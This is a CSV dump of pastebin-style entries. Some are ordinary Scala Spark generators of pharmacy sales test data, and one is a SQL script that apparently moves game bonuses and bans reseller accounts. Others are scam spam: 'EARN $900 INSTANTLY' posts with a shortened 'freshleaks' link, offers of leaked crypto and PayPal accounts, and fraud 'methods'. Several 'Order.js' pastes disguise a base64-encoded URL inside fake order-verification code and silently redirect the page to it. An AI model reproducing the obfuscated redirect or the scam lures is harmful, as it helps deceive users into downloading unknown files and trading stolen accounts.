id,title,username,language,date,content
WPTNb0Ym,testdata4,tills,Scala,Friday 2nd of May 2025 01:02:22 PM CDT,"/**
 * Generates test panel data with two shops and creates a temporary table
 */
def generatePanelData(): Unit = {
  val panelData = Seq(1, 2)
  val panelDF = spark.createDataFrame(panelData.map(Tuple1(_))).toDF(""shop_id"")
  panelDF.createOrReplaceTempView(""lrx_panel"")
  
  println(""Wygenerowano tabelę lrx_panel z 2 sklepami"")
}

/**
 * Generates test product data and creates a temporary table
 */
def generateDimPackData(): Unit = {
  val dimPackData = Seq(
    (1, ""RX"", 20210101, 20211231),
    (2, ""RX"", 20210101, 20211231),
    (3, ""OTC"", 20210101, 20211231)
  )
  
  val dimPackDF = spark.createDataFrame(dimPackData).toDF(
    ""pack_id"", ""basket_4_code"", ""day_id_from"", ""day_id_to""
  )
  
  dimPackDF.createOrReplaceTempView(""dim_pack"")
  
  println(""Wygenerowano tabelę dim_pack z 3 produktami"")
}

/**
 * Generates test sales data and creates temporary table
 */
def generateSalesData(): Unit = {
  // Używamy tylko krotek (tuples) - najbardziej niezawodne podejście
  
  // Dane dla dobrego sklepu jako krotki (tuples)
  val goodShopData = Seq(
    // Miesiąc 1
    (1, 202101, 1, 101, 1, 20210115, 1),
    (1, 202101, 2, 102, 1, 20210115, 2),
    (1, 202101, 3, 103, 3, 20210115, null),
    
    // Miesiąc 2
    (1, 202102, 1, 201, 1, 20210215, 1),
    (1, 202102, 2, 202, 1, 20210215, 2),
    (1, 202102, 3, 203, 3, 20210215, null),
    
    // Miesiąc 3
    (1, 202103, 1, 301, 1, 20210315, 1),
    (1, 202103, 2, 302, 1, 20210315, 2),
    (1, 202103, 3, 303, 3, 20210315, null),
    
    // Miesiąc 4
    (1, 202104, 1, 401, 1, 20210415, 1),
    (1, 202104, 2, 402, 1, 20210415, 2),
    (1, 202104, 3, 403, 3, 20210415, null)
  )
  
  // Dane dla złego sklepu jako krotki (tuples)
  val badShopData = Seq(
    // Miesiąc 1 - dużo RX
    (2, 202101, 101, 1001, 1, 20210115, 1),
    (2, 202101, 102, 1002, 1, 20210115, 2),
    (2, 202101, 103, 1003, 1, 20210115, 3),
    (2, 202101, 104, 1004, 2, 20210115, 1),
    (2, 202101, 105, 1005, 2, 20210115, 2),
    
    // Miesiąc 2 - mało RX
    (2, 202102, 101, 2001, 3, 20210215, null),
    (2, 202102, 102, 2002, 3, 20210215, null),
    (2, 202102, 103, 2003, 3, 20210215, null),
    
    // Miesiąc 3 - znowu dużo RX
    (2, 202103, 101, 3001, 1, 20210315, 1),
    (2, 202103, 102, 3002, 1, 20210315, 2),
    (2, 202103, 103, 3003, 1, 20210315, 3),
    (2, 202103, 104, 3004, 2, 20210315, 1),
    (2, 202103, 105, 3005, 2, 20210315, 2)
    
    // Miesiąc 4 - brak danych (celowo)
  )
  
  // Łączymy dane
  val allData = goodShopData ++ badShopData
  
  // Tworzymy DataFrame używając spark.createDataFrame - najbardziej niezawodna metoda
  val salesDF = spark.createDataFrame(allData).toDF(
    ""shop_id"", ""month_id"", ""patient_id"", ""trn_id"", ""pack_id"", ""day_id"", ""prescriber_id""
  )
  
  // Tworzymy tabelę tymczasową
  salesDF.createOrReplaceTempView(""lrx_sales"")
  
  println(s""Wygenerowano dane sprzedaży z ${salesDF.count()} rekordami"")
}"
ta961xb5,EARN $900 INSTANTLY 2025 95,Just_Bob,JavaScript,Friday 2nd of May 2025 01:00:08 PM CDT," 
Pdf https://tinyurl.com/freshleaks

DAnjKxDukA
"
CwSC9CFQ,Order.js,zebmekey,JavaScript,Friday 2nd of May 2025 12:59:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37131/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CRghTNrP,testdaata3,tills,Scala,Friday 2nd of May 2025 12:58:34 PM CDT,"def generateSalesData(): Unit = {
  import spark.implicits._
  
  // Need a case class for handling null values in prescriber_id
  case class SalesData(
    shop_id: Int, 
    month_id: Int, 
    patient_id: Int, 
    trn_id: Int, 
    pack_id: Int, 
    day_id: Int, 
    prescriber_id: Integer
  )
  
  // Good shop data - meets all criteria
  // Months: 202101, 202102, 202103, 202104
  val goodShopData = Seq(
    // Month 1 - minimal data (3 patients, 3 transactions)
    SalesData(1, 202101, 1, 101, 1, 20210115, 1),  // RX with prescriber
    SalesData(1, 202101, 2, 102, 1, 20210115, 2),  // RX with prescriber
    SalesData(1, 202101, 3, 103, 3, 20210115, null), // OTC without prescriber
    
    // Month 2 - same pattern
    SalesData(1, 202102, 1, 201, 1, 20210215, 1),
    SalesData(1, 202102, 2, 202, 1, 20210215, 2),
    SalesData(1, 202102, 3, 203, 3, 20210215, null),
    
    // Month 3 - same pattern
    SalesData(1, 202103, 1, 301, 1, 20210315, 1),
    SalesData(1, 202103, 2, 302, 1, 20210315, 2),
    SalesData(1, 202103, 3, 303, 3, 20210315, null),
    
    // Month 4 - same pattern
    SalesData(1, 202104, 1, 401, 1, 20210415, 1),
    SalesData(1, 202104, 2, 402, 1, 20210415, 2),
    SalesData(1, 202104, 3, 403, 3, 20210415, null)
  )
  
  // Bad shop data - violates all rules
  val badShopData = Seq(
    // Month 1 - lots of RX (for high RX trend)
    SalesData(2, 202101, 101, 1001, 1, 20210115, 1),
    SalesData(2, 202101, 102, 1002, 1, 20210115, 2),
    SalesData(2, 202101, 103, 1003, 1, 20210115, 3),
    SalesData(2, 202101, 104, 1004, 2, 20210115, 1),
    SalesData(2, 202101, 105, 1005, 2, 20210115, 2),
    
    // Month 2 - few RX (for high RX trend)
    SalesData(2, 202102, 101, 2001, 3, 20210215, null), // Only OTC
    SalesData(2, 202102, 102, 2002, 3, 20210215, null),
    SalesData(2, 202102, 103, 2003, 3, 20210215, null),
    
    // Month 3 - lots of RX again (for high RX trend)
    SalesData(2, 202103, 101, 3001, 1, 20210315, 1),
    SalesData(2, 202103, 102, 3002, 1, 20210315, 2),
    SalesData(2, 202103, 103, 3003, 1, 20210315, 3),
    SalesData(2, 202103, 104, 3004, 2, 20210315, 1),
    SalesData(2, 202103, 105, 3005, 2, 20210315, 2)
    
    // Month 4 - no data (violation of LOW_TRANSACTIONS_NUMBER and LOW_PATIENTS_NUMBER)
  )
  
  // Combine data and create DataFrame
  val allData = goodShopData ++ badShopData
  val salesDF = allData.toDF()
  
  // Create temporary table
  salesDF.createOrReplaceTempView(""lrx_sales"")
  
  println(s""Wygenerowano dane sprzedaży z ${salesDF.count()} rekordami"")
}"
5aSLqzZs,Abuse RBF in BTC transactions,jm33,JavaScript,Friday 2nd of May 2025 12:58:28 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 63837
rT2kwQdj,Crypto Accounts,hubertzoo90,JavaScript,Friday 2nd of May 2025 12:58:27 PM CDT,87695 Accounts Posted On https://t.me/leakzbyeminem
iT7iqJC5,testdata2,tills,Scala,Friday 2nd of May 2025 12:54:36 PM CDT,"def generateSalesData(): org.apache.spark.sql.DataFrame = {
  import spark.implicits._
  
  // Define case class for sales data
  case class SalesData(
    shop_id: Int, 
    month_id: Int, 
    patient_id: Int, 
    trn_id: Int, 
    pack_id: Int, 
    day_id: Int, 
    prescriber_id: Integer  // Using Integer to handle null values
  )
  
  // Data for the good shop (shop_id=1)
  // Has consistent number of patients and transactions across all months
  val goodShopData = Seq(
    // Month 1 - 202101 - stable values (20 patients, mainly RX)
    SalesData(1, 202101, 1, 101, 1, 20210115, 1),
    SalesData(1, 202101, 2, 102, 1, 20210115, 1),
    SalesData(1, 202101, 3, 103, 1, 20210115, 1),
    SalesData(1, 202101, 4, 104, 1, 20210115, 2),
    SalesData(1, 202101, 5, 105, 1, 20210115, 2),
    SalesData(1, 202101, 6, 106, 2, 20210115, 2),
    SalesData(1, 202101, 7, 107, 2, 20210115, 3),
    SalesData(1, 202101, 8, 108, 2, 20210115, 3),
    SalesData(1, 202101, 9, 109, 2, 20210115, 3),
    SalesData(1, 202101, 10, 110, 2, 20210115, 1),
    SalesData(1, 202101, 11, 111, 3, 20210116, null),
    SalesData(1, 202101, 12, 112, 3, 20210116, null),
    SalesData(1, 202101, 13, 113, 3, 20210116, null),
    SalesData(1, 202101, 14, 114, 1, 20210116, 2),
    SalesData(1, 202101, 15, 115, 1, 20210116, 2),
    SalesData(1, 202101, 16, 116, 1, 20210116, 3),
    SalesData(1, 202101, 17, 117, 1, 20210116, 3),
    SalesData(1, 202101, 18, 118, 2, 20210116, 1),
    SalesData(1, 202101, 19, 119, 2, 20210116, 1),
    SalesData(1, 202101, 20, 120, 2, 20210116, 2),

    // Month 2 - 202102 - similar stable values
    SalesData(1, 202102, 1, 201, 1, 20210215, 1),
    SalesData(1, 202102, 2, 202, 1, 20210215, 1),
    SalesData(1, 202102, 3, 203, 1, 20210215, 1),
    SalesData(1, 202102, 4, 204, 1, 20210215, 2),
    SalesData(1, 202102, 5, 205, 1, 20210215, 2),
    SalesData(1, 202102, 6, 206, 2, 20210215, 2),
    SalesData(1, 202102, 7, 207, 2, 20210215, 3),
    SalesData(1, 202102, 8, 208, 2, 20210215, 3),
    SalesData(1, 202102, 9, 209, 2, 20210215, 3),
    SalesData(1, 202102, 10, 210, 2, 20210215, 1),
    SalesData(1, 202102, 11, 211, 3, 20210216, null),
    SalesData(1, 202102, 12, 212, 3, 20210216, null),
    SalesData(1, 202102, 13, 213, 3, 20210216, null),
    SalesData(1, 202102, 14, 214, 1, 20210216, 2),
    SalesData(1, 202102, 15, 215, 1, 20210216, 2),
    SalesData(1, 202102, 16, 216, 1, 20210216, 3),
    SalesData(1, 202102, 17, 217, 1, 20210216, 3),
    SalesData(1, 202102, 18, 218, 2, 20210216, 1),
    SalesData(1, 202102, 19, 219, 2, 20210216, 1),
    SalesData(1, 202102, 20, 220, 2, 20210216, 2),

    // Month 3 - 202103 - similar stable values
    SalesData(1, 202103, 1, 301, 1, 20210315, 1),
    SalesData(1, 202103, 2, 302, 1, 20210315, 1),
    SalesData(1, 202103, 3, 303, 1, 20210315, 1),
    SalesData(1, 202103, 4, 304, 1, 20210315, 2),
    SalesData(1, 202103, 5, 305, 1, 20210315, 2),
    SalesData(1, 202103, 6, 306, 2, 20210315, 2),
    SalesData(1, 202103, 7, 307, 2, 20210315, 3),
    SalesData(1, 202103, 8, 308, 2, 20210315, 3),
    SalesData(1, 202103, 9, 309, 2, 20210315, 3),
    SalesData(1, 202103, 10, 310, 2, 20210315, 1),
    SalesData(1, 202103, 11, 311, 3, 20210316, null),
    SalesData(1, 202103, 12, 312, 3, 20210316, null),
    SalesData(1, 202103, 13, 313, 3, 20210316, null),
    SalesData(1, 202103, 14, 314, 1, 20210316, 2),
    SalesData(1, 202103, 15, 315, 1, 20210316, 2),
    SalesData(1, 202103, 16, 316, 1, 20210316, 3),
    SalesData(1, 202103, 17, 317, 1, 20210316, 3),
    SalesData(1, 202103, 18, 318, 2, 20210316, 1),
    SalesData(1, 202103, 19, 319, 2, 20210316, 1),
    SalesData(1, 202103, 20, 320, 2, 20210316, 2),

    // Month 4 - 202104 - similar stable values
    SalesData(1, 202104, 1, 401, 1, 20210415, 1),
    SalesData(1, 202104, 2, 402, 1, 20210415, 1),
    SalesData(1, 202104, 3, 403, 1, 20210415, 1),
    SalesData(1, 202104, 4, 404, 1, 20210415, 2),
    SalesData(1, 202104, 5, 405, 1, 20210415, 2),
    SalesData(1, 202104, 6, 406, 2, 20210415, 2),
    SalesData(1, 202104, 7, 407, 2, 20210415, 3),
    SalesData(1, 202104, 8, 408, 2, 20210415, 3),
    SalesData(1, 202104, 9, 409, 2, 20210415, 3),
    SalesData(1, 202104, 10, 410, 2, 20210415, 1),
    SalesData(1, 202104, 11, 411, 3, 20210416, null),
    SalesData(1, 202104, 12, 412, 3, 20210416, null),
    SalesData(1, 202104, 13, 413, 3, 20210416, null),
    SalesData(1, 202104, 14, 414, 1, 20210416, 2),
    SalesData(1, 202104, 15, 415, 1, 20210416, 2),
    SalesData(1, 202104, 16, 416, 1, 20210416, 3),
    SalesData(1, 202104, 17, 417, 1, 20210416, 3),
    SalesData(1, 202104, 18, 418, 2, 20210416, 1),
    SalesData(1, 202104, 19, 419, 2, 20210416, 1),
    SalesData(1, 202104, 20, 420, 2, 20210416, 2)
  )
  
  // Data for the bad shop (shop_id=2)
  // Has large variations and no data in the last month (will violate all rules)
  val badShopData = Seq(
    // Month 1 - 202101 - lots of RX (30 patients)
    SalesData(2, 202101, 101, 1001, 1, 20210115, 1),
    SalesData(2, 202101, 102, 1002, 1, 20210115, 1),
    SalesData(2, 202101, 103, 1003, 1, 20210115, 1),
    SalesData(2, 202101, 104, 1004, 1, 20210115, 2),
    SalesData(2, 202101, 105, 1005, 1, 20210115, 2),
    SalesData(2, 202101, 106, 1006, 1, 20210115, 3),
    SalesData(2, 202101, 107, 1007, 1, 20210115, 1),
    SalesData(2, 202101, 108, 1008, 1, 20210115, 2),
    SalesData(2, 202101, 109, 1009, 1, 20210115, 3),
    SalesData(2, 202101, 110, 1010, 1, 20210115, 1),
    SalesData(2, 202101, 111, 1011, 1, 20210116, 2),
    SalesData(2, 202101, 112, 1012, 1, 20210116, 3),
    SalesData(2, 202101, 113, 1013, 1, 20210116, 1),
    SalesData(2, 202101, 114, 1014, 1, 20210116, 2),
    SalesData(2, 202101, 115, 1015, 1, 20210116, 3),
    SalesData(2, 202101, 116, 1016, 2, 20210116, 1),
    SalesData(2, 202101, 117, 1017, 2, 20210116, 2),
    SalesData(2, 202101, 118, 1018, 2, 20210116, 3),
    SalesData(2, 202101, 119, 1019, 2, 20210116, 1),
    SalesData(2, 202101, 120, 1020, 2, 20210116, 2),
    SalesData(2, 202101, 121, 1021, 3, 20210117, null),
    SalesData(2, 202101, 122, 1022, 3, 20210117, null),
    SalesData(2, 202101, 123, 1023, 3, 20210117, null),
    SalesData(2, 202101, 124, 1024, 3, 20210117, null),
    SalesData(2, 202101, 125, 1025, 3, 20210117, null),
    SalesData(2, 202101, 126, 1026, 2, 20210117, 3),
    SalesData(2, 202101, 127, 1027, 2, 20210117, 1),
    SalesData(2, 202101, 128, 1028, 2, 20210117, 2),
    SalesData(2, 202101, 129, 1029, 2, 20210117, 3),
    SalesData(2, 202101, 130, 1030, 2, 20210117, 1),

    // Month 2 - 202102 - few patients (5) and no RX (to create high RX trend)
    SalesData(2, 202102, 101, 2001, 3, 20210215, null),
    SalesData(2, 202102, 102, 2002, 3, 20210215, null),
    SalesData(2, 202102, 103, 2003, 3, 20210215, null),
    SalesData(2, 202102, 104, 2004, 3, 20210215, null),
    SalesData(2, 202102, 105, 2005, 3, 20210215, null),

    // Month 3 - 202103 - many patients (25) and lots of RX again (to create high RX trend)
    SalesData(2, 202103, 101, 3001, 1, 20210315, 1),
    SalesData(2, 202103, 102, 3002, 1, 20210315, 1),
    SalesData(2, 202103, 103, 3003, 1, 20210315, 1),
    SalesData(2, 202103, 104, 3004, 1, 20210315, 2),
    SalesData(2, 202103, 105, 3005, 1, 20210315, 2),
    SalesData(2, 202103, 106, 3006, 1, 20210315, 3),
    SalesData(2, 202103, 107, 3007, 1, 20210315, 1),
    SalesData(2, 202103, 108, 3008, 1, 20210315, 2),
    SalesData(2, 202103, 109, 3009, 1, 20210315, 3),
    SalesData(2, 202103, 110, 3010, 1, 20210315, 1),
    SalesData(2, 202103, 111, 3011, 1, 20210316, 2),
    SalesData(2, 202103, 112, 3012, 1, 20210316, 3),
    SalesData(2, 202103, 113, 3013, 1, 20210316, 1),
    SalesData(2, 202103, 114, 3014, 1, 20210316, 2),
    SalesData(2, 202103, 115, 3015, 1, 20210316, 3),
    SalesData(2, 202103, 116, 3016, 2, 20210316, 1),
    SalesData(2, 202103, 117, 3017, 2, 20210316, 2),
    SalesData(2, 202103, 118, 3018, 2, 20210316, 3),
    SalesData(2, 202103, 119, 3019, 2, 20210316, 1),
    SalesData(2, 202103, 120, 3020, 2, 20210316, 2),
    SalesData(2, 202103, 121, 3021, 3, 20210317, null),
    SalesData(2, 202103, 122, 3022, 3, 20210317, null),
    SalesData(2, 202103, 123, 3023, 3, 20210317, null),
    SalesData(2, 202103, 124, 3024, 3, 20210317, null),
    SalesData(2, 202103, 125, 3025, 3, 20210317, null)

    // Month 4 - 202104 - no data intentionally (will violate LOW_TRANSACTIONS_NUMBER and LOW_PATIENTS_NUMBER)
  )
  
  // Combine data and create DataFrame
  val allData = goodShopData ++ badShopData
  val salesDF = allData.toDF()
  
  println(s""Wygenerowano dane sprzedaży z ${salesDF.count()} rekordami"")
  
  salesDF
}"
SzmvyUUB,News May2 25,Newscaster_Ned,Email,Friday 2nd of May 2025 12:54:06 PM CDT,
u5NHF5wa,EARN $900 INSTANTLY 2025 95,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:50:02 PM CDT," 
Pdf https://tinyurl.com/freshleaks

ClUte0sHFK
"
Er30rC7M,Market.js,zebmekey,JavaScript,Friday 2nd of May 2025 12:43:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01105/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9apsQXcr,Stake Free Balance Method,jm33,JavaScript,Friday 2nd of May 2025 12:43:07 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 67410
3HQ6yxLk,PayPal with Balance,hubertzoo90,JavaScript,Friday 2nd of May 2025 12:43:05 PM CDT,21460 Accounts Posted On https://t.me/leakzbyeminem
dSGsWM2p,Make $1000 15-MINUTES (BEGINNER) L4,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:40:49 PM CDT," 
Pdf https://tinyurl.com/freshleaks

pErZvVzRAL
"
JEwYwmB2,Untitled,Locative,SQL,Friday 2nd of May 2025 12:37:40 PM CDT,"update `bonus` set `gold`=gold-11600  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -11600, '-11600 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+6500  where `id`='1092273'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1092273, NOW(), +6500, '+6500 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-3800  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -3800, '-3800 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+2200  where `id`='1668517'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1668517, NOW(), +2200, '+2200 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-1200  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -1200, '-1200 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+1200  where `id`='293530'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (293530, NOW(), +1200, '+1200 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-111  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -111, '-111 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+111  where `id`='1691193'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1691193, NOW(), +111, '+111 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-7700  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -7700, '-7700 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+6900  where `id`='1571177'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1571177, NOW(), +6900, '+6900 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-80  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -80, '-80 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+80  where `id`='639952'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (639952, NOW(), +80, '+80 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-4235  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -4235, '-4235 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+4235  where `id`='431190'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (431190, NOW(), +4235, '+4235 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-8373  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -8373, '-8373 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+4300  where `id`='676443'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (676443, NOW(), +4300, '+4300 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-2549  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -2549, '-2549 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+100  where `id`='921924'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (921924, NOW(), +100, '+100 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-3810  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -3810, '-3810 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+3070  where `id`='305161'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (305161, NOW(), +3070, '+3070 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-5640  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -5640, '-5640 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+4210  where `id`='1053554'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1053554, NOW(), +4210, '+4210 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-5793  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -5793, '-5793 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+770  where `id`='1304365'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1304365, NOW(), +770, '+770 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-8005  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -8005, '-8005 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+6070  where `id`='407331'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (407331, NOW(), +6070, '+6070 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-3375  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -3375, '-3375 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+3375  where `id`='1642717'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1642717, NOW(), +3375, '+3375 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-2680  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -2680, '-2680 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+2680  where `id`='1332159'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1332159, NOW(), +2680, '+2680 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-1157  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -1157, '-1157 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+1157  where `id`='1059756'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1059756, NOW(), +1157, '+1157 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-17615  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -17615, '-17615 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+9000  where `id`='1536695'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1536695, NOW(), +9000, '+9000 золотых бонусов, возврат краденных бонусов');

UPDATE `characters` SET `account`='1536695' WHERE `guid`='173164'; -- x100
UPDATE `characters` SET `account`='1059756' WHERE `guid`='153386'; -- x100
UPDATE `characters` SET `account`='1332159' WHERE `guid`='174728'; -- x100
UPDATE `characters` SET `account`='1642717' WHERE `guid`='174621'; -- x100
UPDATE `characters` SET `account`='1642717' WHERE `guid`='174622'; -- x100
UPDATE `characters` SET `account`='407331' WHERE `guid`='169348'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145032'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145035'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145033'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145043'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145037'; -- x100
UPDATE `characters` SET `account`='1053554' WHERE `guid`='173835'; -- x100
UPDATE `characters` SET `account`='305161' WHERE `guid`='4672'; -- x100
UPDATE `characters` SET `account`='921924' WHERE `guid`='150523'; -- x100
UPDATE `characters` SET `account`='921924' WHERE `guid`='151916'; -- x100
UPDATE `characters` SET `account`='676443' WHERE `guid`='172424'; -- x100

UPDATE `account` SET `token_key` = 'antiseller', `locked` = 5 WHERE username in ('shelbyz2108', 'shamov95', 'morgyll', 'pistran', 'sam33454', 'SteasyClothing', 'sapogov08', 'panin1999', 'Alina123085', 'stigmatov', 'sp2xone93rus', 'naxx2004', 'delux332208', 'natanzik', 'borkas91', 'Treyli', 'oneback', 'Gera_bo4ka', 'botinki123', 'flaco16', 'nbgjuhfabz');

UPDATE `account` SET `token_key` = 'antiseller', `locked` = 5, `last_ip` = '127.0.0.1' WHERE username in ('shelbyz2108', 'shamov95', 'morgyll', 'pistran', 'sam33454', 'SteasyClothing', 'sapogov08', 'panin1999', 'Alina123085', 'stigmatov', 'sp2xone93rus', 'naxx2004', 'delux332208', 'natanzik', 'borkas91', 'Treyli', 'oneback', 'Gera_bo4ka', 'botinki123', 'flaco16', 'nbgjuhfabz');
"
c3yjDhB8,EARN $900 INSTANTLY 2025⭐ GV,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:31:36 PM CDT," 
Pdf https://tinyurl.com/freshleaks

0euo4zF9Cn
"
7f0AM6tr,Untitled,zebmekey,JavaScript,Friday 2nd of May 2025 12:28:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86238/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
